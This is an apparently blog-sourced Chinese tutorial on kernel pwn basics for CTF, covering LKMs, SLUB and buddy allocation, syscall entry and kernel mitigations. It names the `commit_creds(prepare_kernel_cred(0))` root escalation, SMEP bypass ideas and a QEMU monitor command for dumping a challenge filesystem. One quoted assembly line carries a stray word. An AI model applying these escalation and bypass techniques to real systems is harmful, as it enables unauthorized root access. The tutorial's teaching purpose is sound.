(modules)</li>\n</ul>\n<p>LKMs与用户态可执行文件一样都<strong>采用ELF格式</strong>，但是<strong>LKMs运行在内核空间，且无法脱离内核运行</strong></p>\n<p>通常与LKM相关的命令有以下三个：</p>\n<ul>\n<li><code>lsmod</code>：列出现有的LKMs</li>\n<li><code>insmod</code>：装载新的LKM（需要root）</li>\n<li><code>rmmod</code>：从内核中移除LKM（需要root）</li>\n<li><code>modprobe</code>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li>\n</ul>\n<blockquote>\n<p>大多数CTF比赛中，kernel pwn的漏洞出现在 LKM 中。</p>\n</blockquote>\n<h2 id=\"内核内存管理\"><a href=\"#内核内存管理\" class=\"headerlink\" title=\"内核内存管理\"></a>内核内存管理</h2><p>Linux kernel 将内存分为 <code>页→区→节点</code> 三级结构，主要有两个内存管理器—— <code>buddy system</code> 与 <code>slab allocator</code>。内存结构<strong>自顶向下</strong>依次为：</p>\n<ul>\n<li>节点(node)</li>\n<li>区(zone)</li>\n<li>页(page)</li>\n</ul>\n<h3 id=\"内核内存结构\"><a href=\"#内核内存结构\" class=\"headerlink\" title=\"内核内存结构\"></a>内核内存结构</h3><p>页：Linux kernel 中使用 <code>page</code> 结构体来表示一个物理页框，<strong>每个物理页框都有着一个对应的 page 结构体</strong>。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/MjWZmba9SLH1xIO.png\" alt=\"image.png\"></p>\n<p>区：在 Linux 下将一个节点内<strong>不同用途</strong>的内存区域划分为不同的 <code>区（zone）</code>，对应结构体 <code>struct zone</code>。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/sOwdI5YMNUjLSib.png\" alt=\"偷的图.png\"></p>\n<p>节点：zone 再向上一层便是<strong>节点</strong>——Linux 将<strong>内存控制器（memory controller）</strong>作为节点划分的依据。</p>\n<h3 id=\"内存模型\"><a href=\"#内存模型\" class=\"headerlink\" title=\"内存模型\"></a>内存模型</h3><p>Linux 提供了三种内存模型，定义于 <code>include/asm-generic/memory_model.h</code> 中。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/wLzFuCB5n1DAIY7.png\" alt=\"image.png\"></p>\n<p>内存模型在编译期就会被确定下来，目前常用的是 <code>Sparse Memory</code> 模型，即离散内存模型。</p>\n<h4 id=\"Flat-Memory\"><a href=\"#Flat-Memory\" class=\"headerlink\" title=\"Flat Memory\"></a>Flat Memory</h4><p>平滑内存模型。物理内存地址连续，有一个<strong>全局变量</strong> <code>mem_map</code> ，通过一个大的 <code>struct page</code> 数组直接对应现有的物理内存。</p>\n<h4 id=\"Discontiguous-Memory\"><a href=\"#Discontiguous-Memory\" class=\"headerlink\" title=\"Discontiguous Memory\"></a>Discontiguous Memory</h4><p>非连续性内存模型。主要针对内存中存在空洞的情况。</p>\n<p>对于<strong>每一段连续的物理内存</strong>，都有一个 <code>pglist_data</code> 结构体进行对应，其成员 <code>node_mem_map</code> 为一个 <code>struct page</code> 指针，指向一个 page 结构体数组，由该结构体对应到该段连续物理内存。</p>\n<p>有一个<strong>全局变量</strong> <code>node_data</code> 为一个 <code>pglist_data</code> 指针数组，其中存放着指向每一个 <code>pglist_data</code> 的指针，该数组的大小为 <code>MAX_NUMNODES</code>。</p>\n<h4 id=\"Sparse-Memory\"><a href=\"#Sparse-Memory\" class=\"headerlink\" title=\"Sparse Memory\"></a>Sparse Memory</h4><p>离散内存模型。在一个 <code>mem_section</code> 结构体中存在一个 <code>section_mem_map</code> 成员指向一个 <code>struct page</code> 数组对应一段连续的物理内存，即<strong>将内存按照 <code>section</code> 为单位</strong>进行分段。</p>\n<p>存在一个全局指针数组 <code>mem_section</code> （与结构体同名）存放所有的 <code>mem_section</code> 指针，指向<strong>理论上支持的内存空间</strong>，每个 <code>section</code> <strong>对应的物理内存不一定存在</strong>，若不存在则此时该 section 的指针为 NULL。</p>\n<p>这种模型<strong>支持内存的热拔插</strong>。</p>\n<h3 id=\"buddy-system\"><a href=\"#buddy-system\" class=\"headerlink\" title=\"buddy system\"></a>buddy system</h3><p><code>buddy system</code> 是 Linux kernel 中的一个较为底层的内存管理系统，<strong>以内存页为粒度管理所有的物理内存</strong>，其存在于 <strong>区</strong> 这一级别，对当前区所对应拥有的所有物理页框进行管理</p>\n<p>在每个 zone 结构体中都有一个 <code>free_area</code> 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">zone</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">free_area</span>\t<span class=\"title\">free_area</span>[<span class=\"title\">MAX_ORDER</span>];</span></span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br></pre></td></tr></table></figure>\n\n<p><code>MAX_ORDER</code>为一个常量，其值为<code>11</code>。</p>\n<p>在 buddy system 中<strong>按照空闲页面的连续大小</strong>进行<strong>分阶</strong>管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：$2^{order}$。</p>\n<p><code>free_area</code>中的页面通过自身的相应字段形成<strong>双向链表</strong>结构：</p>\n<p><img src=\"./Kernel_Basic_Knowledge/sOwdI5YMNUjLSib-1678172668801-7.png\" alt=\"偷的图.png\"></p>\n<ul>\n<li>分配：<ul>\n<li>首先会将请求的内存大小向 2 的幂次方张内存页大小<strong>对齐</strong>，之后从<strong>对应的下标</strong>取出连续内存页</li>\n<li>若对应下标链表为<strong>空</strong>，则会从<strong>下一个 order</strong> 中取出内存页，<strong>一分为二</strong>，装载到当前下标对应链表中，之后再返还给上层调用，若下一个 order 也为空则会继续向<strong>更高</strong>的 order 进行该请求过程</li>\n</ul>\n</li>\n<li>释放：<ul>\n<li>将对应的连续内存页释放到对应的链表上</li>\n<li>检索<strong>是否有可以合并</strong>的内存页，若有，则进行合成，放入<strong>更高</strong> order 的链表中</li>\n</ul>\n</li>\n</ul>\n<p>但是我们很容易产生<strong>不容易合并</strong>的内存碎片，因此 Linux kernel 还会进行 <strong>内存迁移</strong> 以减少内存碎片，主要由一个持续运行的内核线程完成。</p>\n<h3 id=\"slab-allocator\"><a href=\"#slab-allocator\" class=\"headerlink\" title=\"slab allocator\"></a>slab allocator</h3><p>slab allocator 则是<strong>更为细粒度的内存管理器</strong>，其通过向 buddy system 请求<strong>单张或多张连续内存页</strong>后再分割成<strong>同等大小</strong>的<strong>对象</strong>（object）返还给上层调用者来实现更为细粒度的内存管理</p>\n<p>slab allocator 一共有三种版本：</p>\n<ul>\n<li>slab（最初的版本，机制比较复杂，效率不高）</li>\n<li>slob（用于嵌入式等场景的极为简化版本）</li>\n<li>slub（优化后的版本，现在的通用版本）</li>\n</ul>\n<h4 id=\"基本结构\"><a href=\"#基本结构\" class=\"headerlink\" title=\"基本结构\"></a>基本结构</h4><p>slub allocator的基本结构如下：</p>\n<p><img src=\"./Kernel_Basic_Knowledge/ivPnbsjHyI94m5z.png\" alt=\"image.png\"></p>\n<p>slub allocator每次向buddy system请求得到的单<strong>张/多张的内存页称为一个<code>slub</code><strong>，这个<code>slub</code>会被分为多个</strong>同样大小</strong>的对象(object)，每个object作为一个被分配的实体。在 <code>slub</code> 的<strong>第一张内存页</strong>对应的 page 结构体上的 <code>freelist</code> 成员指向该张内存页上的<strong>第一个空闲对象</strong>，一个 <code>slub</code> 上的<strong>所有空闲对象</strong>组成一个以 <code>NULL</code> 结尾的<strong>单向</strong>链表。</p>\n<blockquote>\n<p>object类似于堆中的chunk，不过由于page结构体与物理地址之间有线性对应关系，可以直接通过object地址找到对应的page结构体，因此不需要header</p>\n</blockquote>\n<p><code>kmem_cache</code>是allocator一个<strong>分配组件</strong>，用于<strong>分配特定大小（特定用途）</strong>的对象，所有的<code>kmem_cache</code>构成一个<strong>双向</strong>链表。存在两个结构体数组<code>kmalloc_caches</code>和<code>kmalloc_dma_caches</code>对<code>kmem_cache</code>进行管理。</p>\n<p>一个<code>kmem_cache</code>主要由<code>kmem_cache_cpu</code>和<code>kmem_cache_node</code>组成。</p>\n<ul>\n<li><code>kmem_cache_cpu</code>：这是一个<strong>percpu 变量</strong>（即每个核心上都独立保留有一个副本，原理是以<code> gs</code> 寄存器作为 <code>percpu</code> 段的基址进行寻址），用以表示<strong>当前核心正在使用的 <code>slub</code><strong>，因此当前 CPU 在从 kmem_cache_cpu 上取 object 时</strong>不需要加锁</strong>，从而极大地提高了性能</li>\n<li>kmem_cache_node：可以理解为当前kmem_cache的 slub 集散中心，其中存放着<strong>两个 slub 链表</strong>：<ul>\n<li>partial：该 slub 上<strong>存在</strong>着一定数量的<strong>空闲</strong> object，但并非全部空闲</li>\n<li>full：该 slub 上的<strong>所有</strong> object 都被<strong>分配</strong>出去了</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"分配和释放\"><a href=\"#分配和释放\" class=\"headerlink\" title=\"分配和释放\"></a>分配和释放</h4><ul>\n<li>分配：<ul>\n<li>首先从 <code>kmem_cache_cpu</code> 上取对象，若有则直接返回</li>\n<li>若 <code>kmem_cache_cpu</code> 上的 slub 已经无空闲对象了，对应 slub 会被加入到 <code>kmem_cache_node</code> 的 <strong>full</strong> 链表，并尝试从 <strong>partial</strong> 链表上取一个 slub 挂载到 <code>kmem_cache_cpu</code> 上，然后再取出空闲对象返回</li>\n<li>若 <code>kmem_cache_node</code> 的 partial 链表也空了，那就<strong>向 buddy system 请求分配新的内存页</strong>，划分为多个 object 之后再给到 <code>kmem_cache_cpu</code>，取空闲对象返回上层调用</li>\n</ul>\n</li>\n<li>释放：<ul>\n<li>若被释放 object 属于 <code>kmem_cache_cpu</code> 的 slub，直接使用头插法插入当前 CPU slub 的 freelist</li>\n<li>若被释放 object 属于 <code>kmem_cache_node</code> 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist</li>\n<li>若被释放 object 属于 <code>kmem_cache_node</code> 的 full 链表上的 slub，则其会成为对应 slub 的 freelist 头节点，<strong>且该 slub 会从 full 链表迁移到 partial 链表</strong></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"slab-alias\"><a href=\"#slab-alias\" class=\"headerlink\" title=\"slab alias\"></a>slab alias</h4><p>slab alias 机制是一种对<strong>同等/相近大小</strong> object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：</p>\n<p>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配<strong>相等/近似</strong>大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回</strong></p>\n<p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的 <code>kmem_cache</code> 而言，则会<strong>新建</strong>一个新的 <code>kmem_cache</code> 而非为原有的建立 alias。</p>\n<p>如：在 Linux 4.4 之前的版本中，<code>cred_jar</code> 是 <code>kmalloc-192</code>的<code>alias</code>，在此之后的版本中，由于设置了<code>SLAB_ACCOUNT</code> 标志<code>cred_jar</code> 和 <code>kmalloc-192</code>是两个独立的 <code>kmem_cache</code>。（<code>cred_jar</code>是专门用于分配<code>cred</code>结构体的<code>kmem_cache</code>）</p>\n<h2 id=\"内核态函数\"><a href=\"#内核态函数\" class=\"headerlink\" title=\"内核态函数\"></a>内核态函数</h2><p>内核态的函数有些变化：</p>\n<ul>\n<li>printf() -&gt; <strong>printk()<strong>，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在</strong>内核缓冲区</strong>里，可以通过 <code>dmesg</code> 查看效果</li>\n<li>memcpy() -&gt;copy_from_user()/copy_to_user()<ul>\n<li><code>unsigned long copy_from_user(void *to, const void __user *from, unsigned long n)</code>实现了将用户空间的数据传送到内核空间</li>\n<li><code>unsigned long copy_to_user (void __user * to, const void * from, unsigned long n) </code>实现了将内核空间的数据传送到用户空间</li>\n</ul>\n</li>\n<li>malloc() -&gt; **kmalloc()**，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li>\n<li>free() -&gt; **kfree()**，同 kmalloc()</li>\n</ul>\n<p>用于改变权限的函数：</p>\n<ul>\n<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></li>\n<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li>\n</ul>\n<p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。</p>\n<h2 id=\"内核态保护机制\"><a href=\"#内核态保护机制\" class=\"headerlink\" title=\"内核态保护机制\"></a>内核态保护机制</h2><p>与用户态类似，内核态也有对应的保护机制，canary, dep, PIE, RELRO 等保护与用户态原理和作用相同，除此之外，内核还有特殊的保护机制。</p>\n<h3 id=\"KASLR\"><a href=\"#KASLR\" class=\"headerlink\" title=\"KASLR\"></a>KASLR</h3><p>KASLR即<code>内核空间地址随机化</code>（kernel address space layout randomize），与用户态程序的ASLR相类似，在内核镜像映射到实际的地址空间时加上一个随机的偏移值，但是内核内部的<strong>相对偏移</strong>其实还是不变的</p>\n<h3 id=\"FGKASLR\"><a href=\"#FGKASLR\" class=\"headerlink\" title=\"FGKASLR\"></a>FGKASLR</h3><p>KASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，这在用户态pwn中也已经见怪不怪了。</p>\n<p>因此有研究者基于 KASLR 实现了 FGKASLR，<strong>以函数粒度重新排布内核代码</strong>，将每个函数单独分段，每个段的偏移随机化，这会大大提高攻击的难度。目前，FGKASLR 只支持 x86_64 架构。</p>\n<h3 id=\"SMEP-SMAP\"><a href=\"#SMEP-SMAP\" class=\"headerlink\" title=\"SMEP/SMAP\"></a>SMEP/SMAP</h3><p>SMEP即<strong>管理模式执行保护</strong>（Supervisor Mode Execution Protection）。当处理器处于 <code>ring0</code> 模式（内核态）时，<strong>执行用户空间的代码</strong>会触发页错误。（在 arm 中该保护称为 <code>PXN</code>）</p>\n<p> SMAP即<strong>管理模式访问保护</strong>（Superivisor Mode Access Protection），类似于 smep，当处理器处于 <code>ring0</code> 模式（内核态）时，<strong>访问用户空间的数据</strong>会触发错误。</p>\n<p>这两种保护通常是同时开启的，用以阻止<strong>内核空间直接访问/执行用户空间的数据</strong>，完全地将内核空间与用户空间相分隔开，用以<strong>防范ret2usr</strong>（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击。</p>\n<p>绕过方法：</p>\n<ul>\n<li>利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即<strong>一个内核空间地址与一个用户空间地址映射到了同一个页框上</strong>），这种攻击手法称为<code>ret2dir</code></li>\n<li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP<strong>改变CR4寄存器的值</strong>便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行 ret2usr，<strong>但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式</strong>。</li>\n</ul>\n<h3 id=\"STACK-PROTECTOR\"><a href=\"#STACK-PROTECTOR\" class=\"headerlink\" title=\"STACK PROTECTOR\"></a>STACK PROTECTOR</h3><p>类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测<strong>是否发生内核堆栈溢出</strong>，若是发生内核堆栈溢出则会产生 kernel panic</p>\n<p>内核中的 canary 的值通常<strong>取自<code>GS</code>段寄存器某个固定偏移处的值</strong>，可以尝试劫持这个值。</p>\n<h3 id=\"KPTI\"><a href=\"#KPTI\" class=\"headerlink\" title=\"KPTI\"></a>KPTI</h3><p>KPTI即<strong>内核页表隔离</strong>（Kernel page-table isolation），内核空间与用户空间分别使用<strong>两组不同的页表集</strong>，这对于内核的内存管理产生了根本性的变化</p>\n<h3 id=\"Hardened-Usercopy\"><a href=\"#Hardened-Usercopy\" class=\"headerlink\" title=\"Hardened Usercopy\"></a>Hardened Usercopy</h3><p><code>hardened usercopy</code>在用户空间与内核空间之间拷贝数据时进行越界检查，<strong>主要检查拷贝过程中对内核空间中数据的读写是否会越界（包括读写两方面）</strong>。常用于<code>copy_to_user()</code>和<code>copy_form_user()</code>。</p>\n<p>绕过方式：这种保护不适用于内核空间之间的数据拷贝。</p>\n<h3 id=\"Hardened-freelist\"><a href=\"#Hardened-freelist\" class=\"headerlink\" title=\"Hardened freelist\"></a>Hardened freelist</h3><p>在开启这种保护之前，<code>slub</code> 中的 <code>free object</code> 的 <code>next</code> 指针直接存放着 <code>next free object</code> 的地址，攻击者可以通过读取 <code>freelist</code> 泄露出内核线性映射区的地址。</p>\n<p>在开启了该保护之后 <code>free object</code> 的 <code>next</code> 指针存放的是由以下三个值进行<strong>异或</strong>操作后的值：</p>\n<ul>\n<li>当前 <code>free object</code> 的地址</li>\n<li>下一个 <code>free object</code> 的地址</li>\n<li>由 <code>kmem_cache</code> 指定的一个 random 值</li>\n</ul>\n<p>这使得攻击者必须要获取第一和第三个值才能修改<code>free list</code></p>\n<h3 id=\"Random-freelist\"><a href=\"#Random-freelist\" class=\"headerlink\" title=\"Random freelist\"></a>Random freelist</h3><p>这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的 object 的连接顺序是<strong>线性连续</strong>的，但在开启了这种保护之后其上的 object 之间的连接顺序是<strong>随机</strong>的，这让攻击者<strong>无法直接预测</strong>下一个分配的 object 的地址</p>\n<p>需要注意的是这种保护发生在<strong>slub allocator 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO</strong></p>\n<h3 id=\"CONFIG-INIT-ON-ALLOC-DEFAULT-ON\"><a href=\"#CONFIG-INIT-ON-ALLOC-DEFAULT-ON\" class=\"headerlink\" title=\"CONFIG_INIT_ON_ALLOC_DEFAULT_ON\"></a>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</h3><p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），<strong>会将被分配的内存上的内容进行清零</strong>，从而防止了利用未初始化内存进行数据泄露的情况</p>\n<h2 id=\"kernel-pwn相关文件\"><a href=\"#kernel-pwn相关文件\" class=\"headerlink\" title=\"kernel pwn相关文件\"></a>kernel pwn相关文件</h2><p>kernel pwn的题目一般会给以下三个文件：</p>\n<ol>\n<li>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</li>\n<li>bzImage: kernel binary</li>\n<li>rootfs.cpio: 文件系统映像</li>\n</ol>\n<p>qemu部分参数说明如下：</p>\n<ul>\n<li><p><code>-m</code>：虚拟机内存大小</p>\n</li>\n<li><p><code>-kernel</code>：内存镜像路径(bzimage)</p>\n</li>\n<li><p><code>-initrd</code>：磁盘镜像路径(rootfs.cpio)</p>\n</li>\n<li><p><code>-append</code>：附加参数选项</p>\n<ul>\n<li><code>nokalsr</code>：关闭内核地址随机化，方便我们进行调试</li>\n<li><code>rdinit</code>：指定初始启动进程，<code>/sbin/init</code>进程会默认以 <code>/etc/init.d/rcS</code> 作为启动脚本</li>\n<li><code>loglevel=3 </code>&amp; <code>quiet</code>：不输出log</li>\n<li><code>console=ttyS0</code>：指定终端为<code>/dev/ttyS0</code>，这样一启动就能进入终端界面</li>\n</ul>\n</li>\n<li><p><code>-monitor</code>：将监视器重定向到主机设备<code>/dev/null</code>，这里重定向至null主要是防止CTF中被人给偷了qemu拿flag，遇到没有这一行的可以直接通过<code>ctrl a + c</code>进入<code>qemu</code>的<code>monitor</code>模式，之后通过<code>migrate &quot;exec: cat rootfs.cpio 1&gt;&amp;2&quot;</code>查看<code>rootfs.cpio</code>文件，在其中找<code>flag</code>。</p>\n</li>\n<li><p><code>-cpu</code>：设置CPU安全选项（如smep保护）</p>\n</li>\n<li><p><code>-s</code>：相当于<code>-gdb tcp::1234</code>的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>开始学习kernel pwn，在用户态pwn中，我们需要利用用户态程序的漏洞，劫持该程序的执行流，从该程序中起一个<code>shell</code>，或者走<code>orw</code>获得<code>flag</code>。kernel pwn中类似，我们需要利用内核的漏洞，劫持程序流使其能够提权到<code>root</code>或者使其能泄露敏感信息<code>flag</code>。</p>\n<p><strong>kernel pwn和用户态pwn在本质上并没有区别</strong>，利用思路都是相似的，只是细节上会有所差别。一般来说，kernel pwn也不会让我们找内核中的漏洞，而是给出一个有问题的<code>LKM</code>让我们分析。</p>","more":"<h2 id=\"Kernel\"><a href=\"#Kernel\" class=\"headerlink\" title=\"Kernel\"></a>Kernel</h2><p>kernel也就是内核，是操作系统的核心部分，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理。kernel处在应用程序和硬件之间，向上对应用程序提供硬件的使用接口，向下按照应用程序的要求与硬件进行交互。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/image-20230115125518678.png\" alt=\"image-20230115125518678\"></p>\n<p>但无论是应用程序还是操作系统，他们始终都是<strong>程序</strong>，他们<strong>都是在物理地址上运行的代码和数据</strong>，他们之间的区别主要在于<strong>权限</strong>。操作系统能够使用<strong>所有的指令</strong>，这使<strong>内核态代码能完全使用所有硬件</strong>，而应用程序只能使用<strong>一部分指令</strong>，这导致<strong>用户态代码只能部分使用硬件</strong>。</p>\n<p>需要注意的是，<strong>kernel 的 crash 通常会引起重启</strong>。</p>\n<h3 id=\"内核架构\"><a href=\"#内核架构\" class=\"headerlink\" title=\"内核架构\"></a>内核架构</h3><p>通常来说我们可以把内核架构分为两种：<code>宏内核</code>和<code>微内核</code>，现在还有一种内核是混合了宏内核与微内核的特性，称为 <code>混合内核</code> ，宏内核和微内核的区别如下：</p>\n<ul>\n<li>宏内核：此架构的特性是<strong>整个内核程序是一个单一二进制可执行文件</strong>，<strong>几乎所有功能都被集成进内核</strong>。在内核态以监管者模式（Supervisor Mode）来运行在一个单独的地址空间<strong>，所有的内核服务都在一个地址空间运行，相互之间直接调用函数</strong>，简单高效。宏内核会定义出一个高端的虚拟接口，由该接口来涵盖描述整个电脑硬件，这些描述会集合成一组硬件描述用词，有时还会附加一些系统调用，如此可以用一个或多个模块来实现各种操作系统服务。</li>\n<li>微内核：内核中只有最基本的调度、内存管理。驱动、文件系统等都是用户态的守护进程去实现的，<strong>微内核中功能被划分成独立的过程</strong>，<strong>过程间通过IPC进行通信</strong>。模块化程度高，一个服务失效不会影响另外一个服务。</li>\n</ul>\n<p><strong>Linux Kernel采用的是宏内核</strong>。</p>\n<h2 id=\"hierarchical-protection-domains（分级保护域）\"><a href=\"#hierarchical-protection-domains（分级保护域）\" class=\"headerlink\" title=\"hierarchical protection domains（分级保护域）\"></a><strong>hierarchical protection domains</strong>（分级保护域）</h2><p>intel CPU将权限划分为<code>Ring0、Ring1、Ring2、Ring3</code>四个等级，就像这四个等级的名字一样，四个等级构成四个环。</p>\n<p>越里面的环的权限越高，使用硬件的能力越强，其中<code>Ring0</code>表示最高权限，<code>Ring3</code>表示最低权限。通过这种方式对计算机的资源进行分级，实现权限的管理。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/image-20230115130938230.png\" alt=\"image-20230115130938230\"></p>\n<p><code>Ring0</code>拥有最高特权，并且可以和最多的硬件直接交互（比如CPU，内存），因此<strong>操作系统内核代码通常运行在 <code>Ring0</code> 下，即 CPU 在执行操作系统内核代码时处在<code>Ring0</code> 下</strong>。</p>\n<p>应用程序代码通常处在<code>Ring3</code>，拥有的权限最低，即 <strong>CPU 在执行用户进程代码时处在 ring3 下</strong>。</p>\n<p>那么什么是用户态，什么是内核态呢？</p>\n<ul>\n<li>用户态：CPU 运行在 <code>Ring3</code> + 用户进程运行环境上下文</li>\n<li>内核态：CPU 运行在 <code>Ring0</code> + 内核代码运行环境上下文</li>\n</ul>\n<h2 id=\"状态切换\"><a href=\"#状态切换\" class=\"headerlink\" title=\"状态切换\"></a>状态切换</h2><p>当发生<strong>系统调用(syscall,int 0x80)，产生异常，外设产生中断</strong>等事件时，会发生<strong>用户态到内核态</strong>的切换，具体的过程为：</p>\n<ol>\n<li>通过 <code>swapgs</code> 切换<code>GS</code>段寄存器，将 <code>GS</code> 寄存器值<strong>和一个特定位置的值进行交换</strong>，目的是保存<code>GS</code>值，同时将该位置的值<strong>作为内核执行时的<code>GS</code>值</strong>使用。</li>\n<li>将当前栈顶（用户空间栈顶）记录在 <strong>CPU 独占变量区域</strong>里，将 CPU 独占区域里记录的<strong>内核栈顶</strong>放入 <code>rsp/esp</code>。</li>\n<li>通过 push 保存各寄存器值:</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> ENTRY(entry_SYSCALL_64)</span><br><span class=\"line\"> <span class=\"comment\">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class=\"line\"> SWAPGS_UNSAFE_STACK</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">/* 保存栈值，并设置内核栈 */</span></span><br><span class=\"line\"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class=\"line\"> movq <span class=\"title function_\">PER_CPU_VAR</span><span class=\"params\">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class=\"line\"><span class=\"comment\">/* Construct struct pt_regs on stack */</span></span><br><span class=\"line\">pushq  $__USER_DS      <span class=\"comment\">/* pt_regs-&gt;ss */</span></span><br><span class=\"line\">pushq  <span class=\"title function_\">PER_CPU_VAR</span><span class=\"params\">(rsp_scratch)</span>  <span class=\"comment\">/* pt_regs-&gt;sp */</span></span><br><span class=\"line\">pushq  %r11             <span class=\"comment\">/* pt_regs-&gt;flags */</span></span><br><span class=\"line\">pushq  $__USER_CS      <span class=\"comment\">/* pt_regs-&gt;cs */</span></span><br><span class=\"line\">pushq  %rcx             <span class=\"comment\">/* pt_regs-&gt;ip */</span></span><br><span class=\"line\">pushq  %rax             <span class=\"comment\">/* pt_regs-&gt;orig_ax */</span></span><br><span class=\"line\">pushq  %rdi             <span class=\"comment\">/* pt_regs-&gt;di */</span></span><br><span class=\"line\">pushq  %rsi             <span class=\"comment\">/* pt_regs-&gt;si */</span></span><br><span class=\"line\">pushq  %rdx             <span class=\"comment\">/* pt_regs-&gt;dx */</span></span><br><span class=\"line\">pushq  %rcx tuichu    <span class=\"comment\">/* pt_regs-&gt;cx */</span></span><br><span class=\"line\">pushq  $-ENOSYS        <span class=\"comment\">/* pt_regs-&gt;ax */</span></span><br><span class=\"line\">pushq  %r8              <span class=\"comment\">/* pt_regs-&gt;r8 */</span></span><br><span class=\"line\">pushq  %r9              <span class=\"comment\">/* pt_regs-&gt;r9 */</span></span><br><span class=\"line\">pushq  %r10             <span class=\"comment\">/* pt_regs-&gt;r10 */</span></span><br><span class=\"line\">pushq  %r11             <span class=\"comment\">/* pt_regs-&gt;r11 */</span></span><br><span class=\"line\">sub $<span class=\"params\">(<span class=\"number\">6</span>*<span class=\"number\">8</span>)</span>, %rsp      <span class=\"comment\">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>通过汇编指令判断是否为 <code>x32_abi</code>（表示是否为32位系统）。</li>\n<li>通过<strong>系统调用号</strong>，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li>\n</ol>\n<p>当在内核态中的工作执行完时，会从<strong>内核态返回用户态</strong>，过程如下：</p>\n<ol>\n<li>通过 <code>swapgs</code> 恢复<code>GS</code>值</li>\n<li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li>\n</ol>\n<h2 id=\"系统调用\"><a href=\"#系统调用\" class=\"headerlink\" title=\"系统调用\"></a>系统调用</h2><p>系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 